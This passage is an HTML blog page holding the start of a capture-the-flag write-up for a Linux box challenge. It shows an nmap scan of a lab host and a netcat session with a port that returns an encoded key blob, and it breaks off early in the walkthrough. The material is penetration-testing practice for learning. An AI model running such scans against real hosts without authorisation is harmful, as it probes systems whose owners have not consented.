@@ -1,0 +1,1027 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="dark"
+  data-auto-appearance="false"><head>
+  <meta charset="utf-8" />
+  
+  <meta http-equiv="content-language" content="en" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  
+  <title>OSU League 2020/2021 - boxy Writeup &middot; Cameron McCawley</title>
+  <meta name="title" content="OSU League 2020/2021 - boxy Writeup &middot; Cameron McCawley" />
+  
+  
+  <meta name="keywords" content="ctf, " />
+  
+  
+  <link rel="canonical" href="https://example.org/posts/1716569287759-boxy/" />
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.71992c87e391bae446c2fbda2dde0cfabbcdfcb9a739564fdd40990211d219953a16b5a826bf4152e742901a7cc25ea438a7e74a9c36cfe07036b7fe4a7dfbf8.css"
+    integrity="sha512-cZksh&#43;ORuuRGwvvaLd4M&#43;rvN/LmnOVZP3UCZAhHSGZU6FrWoJr9BUudCkBp8wl6kOKfnSpw2z&#43;BwNrf&#43;Sn37&#43;A==" />
+  
+  
+  <script type="text/javascript" src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
+    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.5200170cb3ed0adabce28870bf7ff061203bbefb075c90b7b76cc561cd376288fbd116092bd2e65b027908506b03f8fd15b5613608229bdc92f93ecf6d8faa64.js"
+    integrity="sha512-UgAXDLPtCtq84ohwv3/wYSA7vvsHXJC3t2zFYc03Yoj70RYJK9LmWwJ5CFBrA/j9FbVhNggim9yS&#43;T7PbY&#43;qZA==" data-copy="" data-copied=""></script>
+  
+  
+  <script src="/js/zoom.min.js"></script>
+  
+  
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:title" content="OSU League 2020/2021 - boxy Writeup" />
+<meta property="og:description" content="Time to poke at a linux box and see what there is to find." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://example.org/posts/1716569287759-boxy/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-03-01T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-03-01T00:00:00+00:00" />
+
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="OSU League 2020/2021 - boxy Writeup"/>
+<meta name="twitter:description" content="Time to poke at a linux box and see what there is to find."/>
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Posts",
+    "name": "OSU League 2020\/2021 - boxy Writeup",
+    "headline": "OSU League 2020\/2021 - boxy Writeup",
+    
+    "abstract": "Time to poke at a linux box and see what there is to find.",
+    "inLanguage": "en",
+    "url" : "https:\/\/example.org\/posts\/1716569287759-boxy\/",
+    "author" : {
+      "@type": "Person",
+      "name": "Cameron McCawley"
+    },
+    "copyrightYear": "2021",
+    "dateCreated": "2021-03-01T00:00:00\u002b00:00",
+    "datePublished": "2021-03-01T00:00:00\u002b00:00",
+    
+    "dateModified": "2021-03-01T00:00:00\u002b00:00",
+    
+    "keywords": ["ctf"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "2435"
+  }]
+  </script>
+
+
+  
+  
+  <meta name="author" content="Cameron McCawley" />
+  
+  
+  
+  <link href="mailto:cameronismccawley@gmail.com" rel="me" />
+  
+  
+  <link href="https://github.com/cameron-mccawley" rel="me" />
+  
+  
+  <link href="https://keybase.io/cameronmccawley" rel="me" />
+  
+  
+  <link href="https://www.linkedin.com/in/cameron-mccawley/" rel="me" />
+  
+  
+  <link href="https://infosec.exchange/@cameronmccawley" rel="me" />
+  
+  
+  <link href="https://t.me/PerchikIvanov" rel="me" />
+  
+  
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.js" integrity=""></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+  
+  
+  <meta name="theme-color"/>
+  
+  
+</head>
+<body
+  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32">
+  <div id="the-top" class="absolute flex self-center">
+    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+      href="#main-content"><span
+        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
+  </div>
+  
+  
+  <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
+    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start space-x-3">
+    
+    <div class="flex flex-1 items-center justify-between">
+        <nav class="flex space-x-3">
+
+            
+            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">Cameron McCawley</a>
+            
+
+        </nav>
+        <nav class="hidden md:flex items-center space-x-5 md:ml-12 h-12">
+
+            
+            
+            
+  <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="Posts">
+        posts
+    </p>
+</a>
+
+
+            
+            
+  <a href="/about/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="About">
+        about
+    </p>
+</a>
+
+
+            
+            
+  <a href="/resume/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="Resume">
+        resume
+    </p>
+</a>
+
+
+            
+            
+  <a href=""  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        
+    </p>
+</a>
+
+
+            
+            
+
+            
+
+
+            
+            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+
+            
+            
+            <div
+                class="ltr:mr-14 rtl:ml-14 flex items-center">
+                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400">
+                    <div class="flex items-center justify-center dark:hidden">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                    </div>
+                    <div class="items-center justify-center hidden dark:flex">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                    </div>
+                </button>
+            </div>
+            
+
+        </nav>
+        <div class="flex md:hidden items-center space-x-5 md:ml-12 h-12">
+
+            <span></span>
+
+            
+
+
+            
+            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+            
+            
+            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400" style="margin-right:5px">
+                <div class="flex items-center justify-center dark:hidden">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                </div>
+                <div class="items-center justify-center hidden dark:flex">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                </div>
+            </button>
+            
+
+        </div>
+    </div>
+    <div class="-my-2 -mr-2 md:hidden">
+
+        <label id="menu-button" for="menu-controller" class="block">
+            <input type="checkbox" id="menu-controller" class="hidden" />
+            
+            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+  </span>
+
+
+            </div>
+            <div id="menu-wrapper" style="padding-top:5px;"
+                class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
+                <ul
+                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+
+                    <li>
+                        <span
+                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+</span>
+                    </li>
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="Posts">
+            posts
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/about/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="About">
+            about
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/resume/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="Resume">
+            resume
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href=""  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                </ul>
+                
+                
+
+            </div>
+        </label>
+    </div>
+</div>
+
+
+
+
+
+  
+  <div class="relative flex flex-col grow">
+    <main id="main-content" class="grow">
+      
+
+
+<article>
+  
+
+  <header id="single_header" class="mt-5 max-w-prose">
+    
+    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+      OSU League 2020/2021 - boxy Writeup
+    </h1>
+    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+      
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2021-03-01 00:00:00 &#43;0000 UTC">1 March 2021</time><span class="px-2 text-primary-500">&middot;</span><span>2435 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">12 mins</span>
+  
+
+  
+  
+</div>
+
+
+
+
+
+
+
+    </div>
+
+    
+    
+    
+    
+    
+
+    
+
+    
+      
+      
+        
+        
+<div class="flex author">
+  
+    
+    
+      
+    
+    
+      
+        
+      
+      <img class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4" width="96" height="96"
+      alt="Cameron McCawley" src="/racc_hu7c147036bb39d6f2f9b16fbbcc8c68ae_186284_192x192_fill_box_center_3.png" />
+    
+  
+  <div class="place-self-center">
+    
+    <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+      Author
+    </div>
+    <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+      Cameron McCawley
+    </div>
+    
+    
+    <div class="text-sm text-neutral-700 dark:text-neutral-400">Cybersecurity raccoon.</div>
+    
+    <div class="text-2xl sm:text-lg">
+  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="mailto:cameronismccawley@gmail.com"
+          target="_blank"
+          aria-label="Email"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1c-27.64 140.9 68.65 266.2 199.1 285.1c19.01 2.888 36.17-12.26 36.17-31.49l.0001-.6631c0-15.74-11.44-28.88-26.84-31.24c-84.35-12.98-149.2-86.13-149.2-174.2c0-102.9 88.61-185.5 193.4-175.4c91.54 8.869 158.6 91.25 158.6 183.2l0 16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98 .0036c-7.299 0-13.2 4.992-15.12 11.68c-24.85-12.15-54.24-16.38-86.06-5.106c-38.75 13.73-68.12 48.91-73.72 89.64c-9.483 69.01 43.81 128 110.9 128c26.44 0 50.43-9.544 69.59-24.88c24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3C495.1 107.1 361.2-9.332 207.8 20.73zM239.1 304.3c-26.47 0-48-21.56-48-48.05s21.53-48.05 48-48.05s48 21.56 48 48.05S266.5 304.3 239.1 304.3z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://github.com/cameron-mccawley"
+          target="_blank"
+          aria-label="Github"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://keybase.io/cameronmccawley"
+          target="_blank"
+          aria-label="Keybas"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://www.linkedin.com/in/cameron-mccawley/"
+          target="_blank"
+          aria-label="Linkedin"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://infosec.exchange/@cameronmccawley"
+          target="_blank"
+          aria-label="Mastodon"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M433 179.11c0-97.2-63.71-125.7-63.71-125.7-62.52-28.7-228.56-28.4-290.48 0 0 0-63.72 28.5-63.72 125.7 0 115.7-6.6 259.4 105.63 289.1 40.51 10.7 75.32 13 103.33 11.4 50.81-2.8 79.32-18.1 79.32-18.1l-1.7-36.9s-36.31 11.4-77.12 10.1c-40.41-1.4-83-4.4-89.63-54a102.54 102.54 0 0 1-.9-13.9c85.63 20.9 158.65 9.1 178.75 6.7 56.12-6.7 105-41.3 111.23-72.9 9.8-49.8 9-121.5 9-121.5zm-75.12 125.2h-46.63v-114.2c0-49.7-64-51.6-64 6.9v62.5h-46.33V197c0-58.5-64-56.6-64-6.9v114.2H90.19c0-122.1-5.2-147.9 18.41-175 25.9-28.9 79.82-30.8 103.83 6.1l11.6 19.5 11.6-19.5c24.11-37.1 78.12-34.8 103.83-6.1 23.71 27.3 18.4 53 18.4 175z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://t.me/PerchikIvanov"
+          target="_blank"
+          aria-label="Telegram"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M248,8C111.033,8,0,119.033,0,256S111.033,504,248,504,496,392.967,496,256,384.967,8,248,8ZM362.952,176.66c-3.732,39.215-19.881,134.378-28.1,178.3-3.476,18.584-10.322,24.816-16.948,25.425-14.4,1.326-25.338-9.517-39.287-18.661-21.827-14.308-34.158-23.215-55.346-37.177-24.485-16.135-8.612-25,5.342-39.5,3.652-3.793,67.107-61.51,68.335-66.746.153-.655.3-3.1-1.154-4.384s-3.59-.849-5.135-.5q-3.283.746-104.608,69.142-14.845,10.194-26.894,9.934c-8.855-.191-25.888-5.006-38.551-9.123-15.531-5.048-27.875-7.717-26.8-16.291q.84-6.7,18.45-13.7,108.446-47.248,144.628-62.3c68.872-28.647,83.183-33.623,92.511-33.789,2.052-.034,6.639.474,9.61,2.885a10.452,10.452,0,0,1,3.53,6.716A43.765,43.765,0,0,1,362.952,176.66Z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+  </div>
+
+</div>
+  </div>
+</div>
+
+      
+
+      
+
+      
+      <div class="mb-5"></div>
+      
+
+    
+
+  </header>
+  
+  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+    
+    
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+        
+
+
+        <div class="article-content max-w-prose mb-20">
+          <blockquote>
+<p>Time to poke at a linux box and see what there is to find. Im going to give you the flag right now, and the program to decrypt it too!
+You will have to find 7 flags to solve this challenge! They will be combined through Shamir Secret Sharing, and allow you to decrypt the flag!</p>
+</blockquote>
+<p>For this challenge, we worked in one large group taking turns to solve various parts of the box.  Because of this, and because of the poor documentation we had while solving the box, some of the solutions we came up with are going to be a bit fuzzy in this writeup.</p>
+<p>To start, we are given an IP address of a linux box, so let&rsquo;s do what every pentester must do and give that boy an nmap:</p>
+<pre tabindex="0"><code>Starting Nmap 7.70 ( https://nmap.org ) at 2021-02-26 18:15 PST
+Nmap scan report for 172.17.0.2
+Host is up (0.00030s latency).
+Not shown: 65533 closed ports
+PORT      STATE SERVICE
+1337/tcp  open  waste
+13337/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 3.76 seconds
+</code></pre><p>Great! We have two open ports, let&rsquo;s netcat to them to see what&rsquo;s up.</p>
+<p>Connection to port 1337, we get this:</p>
+<pre tabindex="0"><code>SSH Backup service, Key requested... Implementing security... done... sending...
+SWhJaHVpZHNkSWhJaDtnc2RlZHNoYmo7TVIxdU1SMEJTVGVLVWhDUVREV05UME9ISEdDUlJXW0NXRFRmUjFXW01SMXVNUjFKWGtPQmNGS3RVb3FpUHtHeFZtaXNlRlNwU1RHQ1BUR0NQamIwZWxLdVdUR0NQVEdHWGwxNGVXcVNQVEdDUFRHQ1BUR0NQakdDUFRHT2UxR0NQVEcxZGxMeFsyU2BXdnFTZFQ0VFdZaVFUVEdDUFRPQlhsU2xYVmIzWGxHbmNHaTVSMkB2VGxbRWNVbXtSMk9yWzBDMltEdWBiSWltZWtXc1cybXRbSVdoVFRHQ1BUcURlVmlKW1Y5MmMwT1hCb0dDUFRHQ1BZUzdYe0tvZUdxWVRZbU5XR1c1VTBHQ1BUR0VQbEtqW2xHb09sS2lgRnlYZER1dkxHS2xQMzE0YjF1e2NGZVBlM1NNVm9DNVtZWDBgMGU0Y2xTMFhtREpQVEdDU1RPM2BUW3dTR3EwVFVpb1t4dWtWbEwxV2tLSFRUTzJOR21PWFdxamVHW1ZNMk9VTzFPcmMzU1BgVDByZUVENGJUU3ZlSUdJV2xbR2JWNFJTa2lNWGtLMmJQcTRXMUR3UGtDdmNWNEZPaDh1VGxLTVtFSDBlREdDUFRHRUwxcUNYe09WYDNIe1tJW2hMbUszUFdHS1FQbnVNUjF1TVRXTlNCQ1FURFdOVDBPSEhHQ1JSV1tDV0RUZlIxV1tNUjF1TVIxSjspMy0wOTgzODMxNTE2ODI5NTk0OTYzODI3NDU1MzIzNzU5MDI5ODMxNSg=
+goodbye!
+</code></pre><p>Interesting&hellip; let&rsquo;s do it again:</p>
+<pre tabindex="0"><code>SSH Backup service, Key requested... Implementing security... done... sending...
